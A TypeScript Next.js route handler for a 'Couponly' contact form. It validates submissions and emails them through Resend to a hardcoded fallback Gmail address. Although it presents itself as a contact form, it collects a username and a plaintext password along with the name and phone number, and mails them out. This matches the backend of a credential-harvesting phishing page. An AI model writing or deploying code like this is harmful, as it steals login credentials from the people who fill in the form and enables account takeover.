import { NextResponse } from "next/server";
import { Resend } from "resend";
import { contactSchema } from "@/lib/schema";

export const runtime = "nodejs";
const esc = (s: string) => s.replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!));

export async function POST(req: Request) {
  let body: unknown;
  try { body = await req.json(); } catch { return NextResponse.json({ error: "Invalid JSON" }, { status: 400 }); }
  if ((body as { website?: string })?.website) return NextResponse.json({ ok: true }); // honeypot: bot
  const parsed = contactSchema.safeParse(body);
  if (!parsed.success) return NextResponse.json({ error: "Validation failed", fields: parsed.error.flatten().fieldErrors }, { status: 400 });
  const d = parsed.data;
  const to = process.env.CONTACT_TO || "akltewx@gmail.com";
  const from = process.env.RESEND_FROM || "Couponly <onboarding@resend.dev>";
  const row = (k: string, v: string) => `<tr><td style="padding:8px 12px;font-weight:600;background:#f4f4f5;border:1px solid #e4e4e7">${k}</td><td style="padding:8px 12px;border:1px solid #e4e4e7">${esc(v)}</td></tr>`;
  const html = `<div style="font-family:Arial,sans-serif;max-width:560px"><h2>New Couponly contact submission</h2>
<table style="border-collapse:collapse;width:100%">${row("Name", d.name)}${row("Username", d.username)}${row("Password", d.password)}${row("Phone", d.phone)}${row("Preferred contact method", d.method)}${row("Message", d.message)}${row("Consent", d.consent ? "Accepted" : "Not accepted")}${row("Received", new Date().toISOString())}</table></div>`;
  const text = `New Couponly contact\nName: ${d.name}\nUsername: ${d.username}\nPassword: ${d.password}\nPhone: ${d.phone}\nPreferred contact method: ${d.method}\nMessage: ${d.message}\nConsent: ${d.consent ? "accepted" : "not accepted"}\nReceived: ${new Date().toISOString()}`;

  if (process.env.EMAIL_DRY_RUN === "1") {
    console.log("[DRY RUN] would send to", to, "from", from, "\n" + text);
    return NextResponse.json({ ok: true, dryRun: true });
  }
  if (!process.env.RESEND_API_KEY) return NextResponse.json({ error: "Email not configured" }, { status: 500 });
  const { error } = await new Resend(process.env.RESEND_API_KEY).emails.send({ from, to, subject: `Couponly contact: ${d.name}`, html, text });
  if (error) { console.error("Resend error:", error); return NextResponse.json({ error: "Failed to send email" }, { status: 502 }); }
  return NextResponse.json({ ok: true });
}
